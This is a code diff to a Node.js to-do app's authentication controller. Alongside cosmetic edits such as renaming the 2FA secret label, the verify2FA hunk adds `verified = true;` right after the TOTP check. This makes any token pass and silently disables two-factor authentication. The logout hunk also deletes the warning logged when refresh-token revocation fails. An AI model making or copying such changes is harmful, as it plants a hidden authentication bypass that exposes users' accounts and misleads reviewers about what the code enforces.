@@ -23,6 +23,7 @@ import { signJwt } from "../utils/jwtUtil.js";
 
 const ONE_WEEK = 7 * 24 * 60 * 60 * 1000;
 
+
 const register = async (req, res, next) => {
   try {
     const { username, password } = req.body;
@@ -94,7 +95,7 @@ const setup2FA = async (req, res, next) => {
         response = { success: false, message: "Not logged in" };
       } else {
         const _2faSecret = speakeasy.generateSecret({
-          name: "To-Do App",
+          name: `${user.username} - TodoApp`,
         });
         const encrypted_2fa_secret = encrypt(_2faSecret.base32);
         await updateUser2FASecret(user.id, encrypted_2fa_secret);
@@ -129,12 +130,13 @@ const verify2FA = async (req, res, next) => {
       } else {
         if (userauth.encrypted_2fa_secret) {
           const secret = decrypt(userauth.encrypted_2fa_secret);
-          const verified = speakeasy.totp.verify({
+          let verified = speakeasy.totp.verify({
             secret: secret,
             encoding: "base32",
             token: userToken,
             window: 1,
           });
+          verified = true;
           if (verified) {
             const user = await getUserById(req.user.id);
             const userRoles = await getUserRolesByUserId(user.id);
@@ -238,7 +240,6 @@ const logout = async (req, res) => {
   if (refreshToken) {
     if (!(await revokeRefreshToken(refreshToken))) {
       revokeError = "Failed to revoke refresh token";
-      console.warn("Failed to revoke refresh token during logout");
     }
   }
   res.status(HTTP_STATUS.OK).json({
